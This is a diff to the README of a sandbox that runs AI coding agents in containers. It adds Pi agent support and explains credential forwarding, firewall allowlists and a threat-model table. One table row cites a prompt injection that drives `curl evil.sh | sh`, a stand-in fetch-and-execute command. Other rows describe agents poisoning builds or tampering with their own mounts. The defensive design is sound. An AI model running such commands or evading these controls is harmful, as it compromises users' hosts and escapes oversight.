@@ -14,7 +14,7 @@ for as long as possible and make any shortfall visible:
   refreshes and persists its token using its own maintained logic; the refreshed
   credential is then staged, so the container starts with a near-full window.
   This runs under a per-agent lock, is best-effort, and is skipped with
-  `--no-token-refresh`. OpenCode has no delegated refresh.
+  `--no-token-refresh`. OpenCode and Pi have no delegated refresh.
 - **Start-of-session warning.** When credentials are forwarded, the launch prints
   the remaining lifetime of the staged token (`claudeAiOauth.expiresAt` for
   Claude; the `exp` claim of the Codex access-token JWT). If the session outlives
@@ -23,7 +23,10 @@ for as long as possible and make any shortfall visible:
   host login, so you need to re-authenticate on the host and re-run to re-stage
   afterward. Sessions are not killed at the deadline. For OpenCode, the
   soonest-expiring OAuth provider in its `auth.json` is used; long-lived/API-key
-  providers carry no host-logout risk and show no warning.
+  providers carry no host-logout risk and show no warning. Pi's `auth.json`
+  shape is not yet parsed by this check (deferred; see `TODO.md`), so no
+  expiry warning is shown for Pi and the in-container agent's own refresh
+  behavior applies.
 - `--no-forward-credentials` starts the container unauthenticated. Host
   credentials are not read, staged, or mounted; any credentials left in the
   staging area by a previous forwarding run are removed, and the generated
@@ -33,9 +36,15 @@ for as long as possible and make any shortfall visible:
   dry-runs redact values, but real runs still pass those values through the
   runtime process environment.
 
-OpenCode can be configured with multiple providers. The default firewall allows
-OpenAI and Anthropic endpoints; use `--allow-github` for GitHub Copilot, or
-`--extra-domain DOMAIN` for another provider endpoint.
+OpenCode and Pi can each be configured with multiple providers (BYOK). The
+default firewall allows OpenAI and Anthropic endpoints; use `--allow-github`
+for GitHub Copilot, or `--extra-domain DOMAIN` for another provider endpoint.
+Selecting `--agent pi` (or `opencode`) with the firewall enabled prints a
+warning to this effect. Pi also has no built-in permission/confirmation
+system, so headless runs always pass `--approve`, trusting the project-local
+`.pi/` config for that run; the container's firewall and filesystem
+boundaries remain the safety net, consistent with Pi's own "run in a
+container" guidance.
 
 ## Network Firewall
 
@@ -90,8 +99,8 @@ Customize:
 | DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
 | Malicious npm post-install scripts | Run as the unprivileged `agent` user (host-matched for Docker/Podman on Linux); no access to unmounted host paths. |
-| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `disable_update_check = true` for Codex. OpenCode config is not currently sanitized; see `TODO.md`. |
-| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex. OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
+| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `disable_update_check = true` for Codex; `PI_SKIP_VERSION_CHECK=1` for Pi. OpenCode config is not currently sanitized; see `TODO.md`. |
+| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex; `PI_OFFLINE=1` for Pi (disables startup update/telemetry network calls). OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
 | API token leakage via process environment | Default forwarded agent tokens are passed through mounted credential files, not environment variables; host staging files are kept under a private `/tmp` directory. Explicit `--api-key-env*` injection is opt-in, requires `--no-forward-credentials`, and redacts dry-run output, but the selected keys are still present in the runtime process environment during real runs. |
 | Agent rewrites the project `--dockerfile` to poison the next build | The project Dockerfile's SHA256 is recorded under the masked `.project-sandbox/.dockerfile-checksums.json`, which the sandbox cannot read or modify; a later run warns when the Dockerfile changed since it was last built. |
 | Agent reads or edits `.devcontainer` host-path mounts and config | `/workspace/.devcontainer` is masked with an empty read-only mount in both direct runs and devcontainers. |
